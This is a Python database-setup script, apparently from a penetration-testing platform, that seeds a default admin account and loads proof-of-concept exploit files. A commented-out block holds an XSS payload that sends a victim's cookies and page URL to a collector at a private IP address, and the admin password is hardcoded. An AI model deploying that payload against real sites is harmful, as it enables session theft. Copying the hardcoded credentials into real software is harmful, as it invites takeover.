#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2019/5/22
# @File    : db_init.py
# @Desc    : ""

import os
import sys
from fuxi.common.utils.logger import logger
from sqlalchemy.exc import OperationalError
from fuxi.common.utils.poc_parser import poc_parser
from fuxi.core.databases.orm.user import DBFuxiAdmin
from fuxi.core.databases.orm.pocsuite import DBPocsuitePlugin


def databases_init():
    try:
        if not DBFuxiAdmin.find_one():
            DBFuxiAdmin.add_admin(
                username="fuxi", password="whoami",
                nick="Administrator", email="admin@fuxi.com",
            )
        if not DBPocsuitePlugin.find_one():
            _poc_path = os.path.abspath(os.path.dirname(__file__)) + "/pocs"
            for poc_filename in os.listdir(_poc_path):
                with open(_poc_path + "/" + poc_filename, "r", encoding="UTF-8") as poc_read:
                    poc_str = poc_read.read()
                    poc_data = poc_parser(poc_str)
                    DBPocsuitePlugin.add(
                        name=poc_data['name'], poc_str=poc_str, filename=poc_filename,
                        app=poc_data['app'], poc_type=poc_data['type']
                    )
    except OperationalError:
        # 捕获数据库连接错误
        logger.error("OperationalError: can't connect to database server")
        sys.exit(0)
    except Exception as e:
        logger.error("database initialization failure: {}".format(e))
        sys.exit(0)
    #
    # if not MongoDB(T_XSS_PAYLOADS).find_one():
    #     MongoDB(T_XSS_PAYLOADS).insert_one({
    #         "name": "document.cookie",
    #         "value": "var url = document.location.href\nvar data = 'cookie=' + encodeURIComponent("
    #                  "document.cookie)\nvar img = document.createElement('img');\nimg.width = 0;\nimg.height = "
    #                  "0;\nvar api = 'http://192.168.199.147:50010/xss';\nimg.src = "
    #                  "api+'?salt='+salt+'&url='+encodeURIComponent(url)+'&data='+ encodeURIComponent(data);\n",
    #         "date": "2019-01-01 23:59:59"
    #     })
    #
